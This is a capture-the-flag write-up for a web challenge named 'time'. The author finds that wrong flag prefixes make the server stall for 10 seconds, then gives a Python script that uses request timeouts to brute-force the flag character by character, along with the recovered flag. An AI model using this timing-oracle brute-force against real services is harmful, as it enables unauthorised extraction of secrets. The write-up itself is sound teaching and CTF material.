# Misc challenges
## Table of contents
- [time (15 solves)](./misc.md#time)

### time
```
Find the flag
```
**Attachements :**
- One website called `time.brb`
- [Trei Digete - Time Time](https://www.youtube.com/watch?v=st8xWyMZXOU)

#### Solution
As I don't have the sources of this challenge, it will be hard to explain well how it worked. But I will try.<br>
So, clicking on the website provided, we have a pretty simple page where we can see `Find the flag` written just above a text box.<br>
I will pass some minutes/hours of search, but after testing a lot of possibilities, you could find that when you test something, the website if really long to respond. Like really long. A bit too long. Then you can check how long it is but using your favorite browser's functionality to see how much time it takes for the server to respond. And now, you can see that it takes exactly 10 seconds. 10.00 seconds exactly. This is the time you realise that your life is a mess and that everything was long because it was in fact the challenge.<br>
After questioning every part of your life, you try to do something to see if the website can just respond instantly.<br>
After some minutes you may try to type the beginning of each flag at Barbhach : `brb`<br>
And then, magically, the website responds in no time ! Now the only thing to do is to bruteforce the flag.<br>
We can just make a get request that calls `http://time.brb:3000/index.php?flag=` and then put your flag in URL Encode.<br>
Just before we see the bruteforce script, I have to tell you that `#` and `&` have to be encoded by the script, otherwise it will break it.<br>
So here is the script :
```py
from urllib.parse import quote
import requests

url = "http://time.brb:3000/index.php?flag="

flag = "brb{"

while flag[-1] != "}":
    for i in range(33, 127):
        charToTest = chr(i)
        if charToTest == "#":
            charToTest = "%23"
        elif charToTest == "&":
            charToTest = "%26"
        else:
            charToTest = quote(charToTest, safe="")
        try:
            urlToSend = url + flag + charToTest
            print("Char tested: " + charToTest)
            r = requests.get(urlToSend, timeout=2)
            print("Char found: " + charToTest)
            flag += charToTest
            break
        except:
            pass

print("Full flag : " + flag)
```
Here, the bruteforce works because of the timeout. It is very important to timeout the requests otherwise the bruteforce would take ages, or the network would be overloaded (if you do it asynchronously). Trust me I've done it and it ain't good.<br>
If the request is timed out, the code will raise an error, that we intercept with the `try, except` keywords. Otherwise, it will print char found and add it to the flag.<br>
The output, in the end, is `brb{t1mkspKAW%3D%25q%26%24%5Emz}`<br>
We just need to URL Decode it with CyberChef for example to have our flag !

#### Flag
```
brb{t1mkspKAW=%q&$^mz}
```
